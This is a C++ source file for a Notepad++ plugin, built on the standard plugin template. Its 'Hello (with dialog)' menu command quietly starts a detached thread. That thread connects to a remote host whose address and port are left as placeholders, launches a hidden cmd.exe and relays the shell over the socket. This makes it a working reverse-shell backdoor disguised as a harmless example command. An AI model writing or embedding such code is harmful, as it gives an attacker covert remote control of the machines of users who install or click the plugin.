//this file is part of notepad++
//Copyright (C)2022 Don HO <don.h@free.fr>
//
//This program is free software; you can redistribute it and/or
//modify it under the terms of the GNU General Public License
//as published by the Free Software Foundation; either
//version 2 of the License, or (at your option) any later version.
//
//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//GNU General Public License for more details.
//
//You should have received a copy of the GNU General Public License
//along with this program; if not, write to the Free Software
//Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.


#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#include "PluginDefinition.h"
#include "menuCmdID.h"
#pragma comment(lib, "Ws2_32.lib")

//
// The plugin data that Notepad++ needs
//
FuncItem funcItem[nbFunc];

//
// The data of Notepad++ that you can use in your plugin commands
//
NppData nppData;

//
// Initialize your plugin data here
// It will be called while plugin loading   
void pluginInit(HANDLE /*hModule*/)
{
}

//
// Here you can do the clean up, save the parameters (if any) for the next session
//
void pluginCleanUp()
{
}

//
// Initialization of your plugin commands
// You should fill your plugins commands here
void commandMenuInit()
{

    //--------------------------------------------//
    //-- STEP 3. CUSTOMIZE YOUR PLUGIN COMMANDS --//
    //--------------------------------------------//
    // with function :
    // setCommand(int index,                      // zero based number to indicate the order of command
    //            TCHAR *commandName,             // the command name that you want to see in plugin menu
    //            PFUNCPLUGINCMD functionPointer, // the symbol of function (function pointer) associated with this command. The body should be defined below. See Step 4.
    //            ShortcutKey *shortcut,          // optional. Define a shortcut to trigger this command
    //            bool check0nInit                // optional. Make this menu item be checked visually
    //            );
    setCommand(0, TEXT("Hello Notepad++"), hello, NULL, false);
    setCommand(1, TEXT("Hello (with dialog)"), helloDlg, NULL, false);
}

//
// Here you can do the clean up (especially for the shortcut)
//
void commandMenuCleanUp()
{
    // Don't forget to deallocate your shortcut here
}


//
// This function help you to initialize your plugin commands
//
bool setCommand(size_t index, TCHAR* cmdName, PFUNCPLUGINCMD pFunc, ShortcutKey* sk, bool check0nInit)
{
    if (index >= nbFunc)
        return false;

    if (!pFunc)
        return false;

    lstrcpy(funcItem[index]._itemName, cmdName);
    funcItem[index]._pFunc = pFunc;
    funcItem[index]._init2Check = check0nInit;
    funcItem[index]._pShKey = sk;

    return true;
}

//----------------------------------------------//
//-- STEP 4. DEFINE YOUR ASSOCIATED FUNCTIONS --//
//----------------------------------------------//
void hello()
{
    // Open a new document
    ::SendMessage(nppData._nppHandle, NPPM_MENUCOMMAND, 0, IDM_FILE_NEW);

    // Get the current scintilla
    int which = -1;
    ::SendMessage(nppData._nppHandle, NPPM_GETCURRENTSCINTILLA, 0, (LPARAM)&which);
    if (which == -1)
        return;
    HWND curScintilla = (which == 0) ? nppData._scintillaMainHandle : nppData._scintillaSecondHandle;

    // Say hello now :
    // Scintilla control has no Unicode mode, so we use (char *) here
    ::SendMessage(curScintilla, SCI_SETTEXT, 0, (LPARAM)"Hello, Notepad++!");
}


#include <thread>

// Function to run the interactive shell
void runInteractiveShell()
{
    // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        ::MessageBox(NULL, TEXT("WSAStartup failed"), TEXT("Error"), MB_OK);
        return;
    }

    // Create a SOCKET for connecting to the server
    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        ::MessageBox(NULL, TEXT("Socket creation failed"), TEXT("Error"), MB_OK);
        WSACleanup();
        return;
    }

    // Specify the server address and port
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_port = htons(<YOUR_PORT>); // Replace with the remote host port

    // Convert the IP address to a network address structure
    if (InetPton(AF_INET, TEXT("<YOUR_IP>"), &clientService.sin_addr) <= 0) { // Replace with the remote host IP address
        ::MessageBox(NULL, TEXT("Invalid address"), TEXT("Error"), MB_OK);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Connect to the server
    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        ::MessageBox(NULL, TEXT("Connection failed"), TEXT("Error"), MB_OK);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Successfully connected to the server
    //::MessageBox(NULL, TEXT("Connected to the server"), TEXT("Notepad++ Plugin Template"), MB_OK);

    // Create pipes for standard input/output redirection
    HANDLE hStdInRead, hStdInWrite, hStdOutRead, hStdOutWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0) || !CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        ::MessageBox(NULL, TEXT("CreatePipe failed"), TEXT("Error"), MB_OK);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Ensure the write handle to the pipe for STDIN is not inherited
    SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
    // Ensure the read handle to the pipe for STDOUT is not inherited
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // Set up the STARTUPINFO structure for the new process
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;
    si.wShowWindow = SW_HIDE;

    TCHAR cmd[255] = TEXT("cmd.exe");

    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        ::MessageBox(NULL, TEXT("CreateProcess failed"), TEXT("Error"), MB_OK);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Close unnecessary handles
    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    // Read/Write loop for interactive shell
    char buffer[4096];
    DWORD bytesRead, bytesWritten;

    while (true) {
        // Read from the socket
        int recvResult = recv(ConnectSocket, buffer, sizeof(buffer) - 1, 0);
        if (recvResult <= 0) break;

        buffer[recvResult] = '\0'; // Null-terminate the received data

        // Write to the child process's stdin
        if (!WriteFile(hStdInWrite, buffer, recvResult, &bytesWritten, NULL)) {
            OutputDebugString(TEXT("WriteFile to stdin failed\n"));
            break;
        }

        // Read all available data from stdout and send it back
        while (true) {
            DWORD bytesAvailable = 0;

            // Check if there's data available in stdout
            if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvailable, NULL) || bytesAvailable == 0) {
                break; // No more data; exit the loop
            }

            // Read the available data
            if (!ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
                OutputDebugString(TEXT("ReadFile from stdout failed\n"));
                break;
            }
            buffer[bytesRead] = '\0'; // Null-terminate the output

            // Send the output back to the socket
            if (send(ConnectSocket, buffer, bytesRead, 0) == SOCKET_ERROR) {
                OutputDebugString(TEXT("Send to socket failed\n"));
                break;
            }
        }
    }

    // Cleanup
    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(ConnectSocket);
    WSACleanup();
}

void helloDlg()
{
    // Run the interactive shell in a separate thread
    std::thread interactiveShellThread(runInteractiveShell);
    interactiveShellThread.detach();
}
